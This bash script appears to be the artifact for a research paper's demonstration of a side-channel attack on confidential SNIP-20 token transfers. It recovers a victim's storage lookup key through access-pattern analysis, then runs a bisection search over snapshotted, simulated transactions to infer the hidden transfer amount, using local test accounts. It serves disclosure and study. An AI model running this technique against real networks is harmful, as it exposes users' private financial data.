#!/bin/bash

set -e

source ./scripts/demo_utils.sh
source ./scripts/local_test_params.sh

CONTRACT_ADDRESS=$(cat $BACKUP/contractAddress.txt)
CODE_HASH=$(cat $BACKUP/codeHash.txt)

teebox info-panel "Artifact for Section 5.3" --title "Inferring SNIP-20 Transfer Amounts"
teebox info-panel $'[bold]Sendo[/]: Sender of the transaction being attacked\n[bold]Receivo[/]: Receiver of the transaction being atacked\n[bold]Atako[/]: Attacker who can modify the untrusted code base and simulate transactions' --title "Cast of Characters"

teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to initialize [bold]Sendo[/]'s transaction ..."

sender=${ACC0}
attacker=${ACC1}
receivo=${ACC2}
AMOUNT='10'

snapshot_uniq_label=$(date '+%Y-%m-%d-%H:%M:%S')
set_snapshot "${snapshot_uniq_label}-start"

teebox info-panel ":warning: :construction: [red dim]In a real-world scenario [bold]Sendo[/]'s transaction would already exist, and could be fetched from the blockchain[/] :construction: :warning:" --title "Initialization of [bold]Sendo[/]'s Transaction"
# generate victim tx: sender -> ACC2
#generate_and_sign_transfer ${sender} $ACC2 ${AMOUNT} snip20_victim
#teebox log "generate victim tx: sender -> ACC2"
teebox log "Imagine you are Sendo (address=${sender}) and you are generating a SNIP20 transfer transaction of [bold]T=${AMOUNT}[/] tokens to [bold]Receivo[/] (address=${receivo})"
generate_and_sign_transfer ${sender} ${receivo} ${AMOUNT} snip20_victim
teebox log "Sendo's transaction is saved under [bold]tx_snip20_victim.json[/]"
# TODO prompt to show transaction's body to highlight that the receiver and amount cannot be read
#teebox print-json "tx_snip20_victim_sign.json"
#teebox info-panel "${AMOUNT} tokens" --title "Transfer Transaction Amount"

rm -f $BACKUP/victim_key
rm -f $BACKUP/adv_key
rm -f $BACKUP/adv_value
touch $BACKUP/victim_key
touch $BACKUP/adv_key
touch $BACKUP/adv_value

# get victim key
teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to transform into the attacker, Atako, and do some access pattern analysis to guess the database key used to access Sendo's balance ..."
echo
teebox info-panel "using access pattern analysis" --title "Sender's Balance Database Key Inferrence"
teebox log "Get victim database lookup key :key: :open_file_folder: ..."
teebox log "Generate transfer tx: attacker account --> sender account"
generate_and_sign_transfer ${attacker} ${sender} ${AMOUNT} snip20_getkey
rm -f $BACKUP/kv_store
touch $BACKUP/kv_store

teebox log "Simulate transfer tx to observe victim account database lookup key :key: :open_file_folder:"
simulate_tx snip20_getkey
tag=$(sed '5q;d' $BACKUP/kv_store)
echo
teebox info-panel "$tag" --title "Key-Value Store Lookup Key for Victim Account"
echo

#tag=${tag:6:64}
tag=${tag:6:-1}
echo $tag > $BACKUP/backup_victim_key

# function TransferAmountInferenceAttack(Tx_victim)
teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to go on as Atako the attacker, to do a bisection search to guess the transfer amount of Sendo's transaction ..."

low=0
high=40
cnt=0
while [ $(expr ${high} - ${low}) -ne 0 ]; do
    # P := (low+high)/2
    probe=$(( (high + low ) / 2))

    teebox info-panel ":mag: Iteration ${cnt} :mag:" --title "Bisection Search for the Transfer Amount"
    teebox log "[bold]low=${low}[/], [bold]high=${high}[/], [bold]probe=${probe}[/]"
    #teebox log "[bold]low=${low}[/], [bold]high=${high}[/]"
    #teebox log "Set [bold]probe=(high+low)/2[/]"
    #teebox log "[bold]probe=${probe}[/]"
    echo
    
    #lookup_key=$(cat $BACKUP/backup_victim_key)
    #teebox log "lookup key: $lookup_key"
    cp -f $BACKUP/backup_victim_key $BACKUP/victim_key

    # Fork()
    teebox log "Fork()    [light_goldenrod1]# set snapshot of database[/]"
    # TODO what does this do exactly?
    set_snapshot "${snapshot_uniq_label}-${cnt}"

    # TODO What is doing that?
    teebox log "Replay(balance\[sender]=0)    [light_goldenrod1]# reset sender's balance to zero"
    
    # Figure 5 in paper, line 11
    # Simulate(Transfer(attacker, sender, P))
    #teebox log "Simulate transfer transaction from attacker to victim for the amount of [bold]probe[/]=${probe} tokens"
    teebox log "[bold]Simulate(Transfer(attacker, sender, probe=${probe}))[/]"
    generate_and_sign_transfer ${attacker} ${sender} ${probe} snip20_adv
    simulate_tx snip20_adv
    #simulate_tx_attacker_result=$(cat $BACKUP/simulate_result)
    #teebox log "[bold]Simulate(Tx_attacker)[/] result: $simulate_tx_attacker_result"

    #teebox log "Replay the victim's transfer transaction of ${AMOUNT} tokens"
    teebox log "[bold]Simulate(Tx_victim)[/]"
    simulate_tx snip20_victim

    # See app/app.go
    # -- if transaction completed, 0 is written to file; think exit(0)
    # -- else if transaction failed, 1 is written to file; think exit(1)
    simulate_tx_victim_result=$(cat $BACKUP/simulate_result)
    #teebox log "Result: $simulate_tx_victim_result"
    echo

    # Assumes exit code 0, meaning successful, and exit code 1, meaning failure
    if [ $simulate_tx_victim_result != 0 ]; then
        ((low=probe+1));
        teebox log "Simulation of victim transaction [red]failed[/], [bold yellow]probe[/] is too low ([bold yellow]probe[/] < [bold yellow]T[/]), increase next [bold yellow]probe[/] amount by setting [bold]low[/]=[bold][yellow]probe[/]+1=${low}[/]"
    else
        teebox log "Simulation of victim transaction [green]succeeded[/], [bold yellow]probe[/] is high enough ([bold yellow]probe[/] >= [bold yellow]T[/]), decrease next [bold yellow]probe[/] amount by setting [bold]high[/]=[bold][yellow]probe[/]=${probe}[/]"
        high=${probe};
    fi

    cnt=$((cnt + 1))

    #teebox log "After simulations:"
    #teebox log "low: ${low}, high: ${high}, probe: ${probe}"
    teebox enter-prompt "Press [ Enter :leftwards_arrow_with_hook: ] to execute the next iteration of the bisection search ..."
    echo
    echo
done
#text="[bold yellow]T[/]=[green]${low}[/] tokens"
#teebox info-panel "${text}" --title "Bisection Search Completed!"
teebox info-panel ":mag: Completed! :dizzy:" --title "Bisection Search for the Transfer Amount"
echo
teebox log "The inferred transfer amount is [bold]T=${low}[/] tokens"
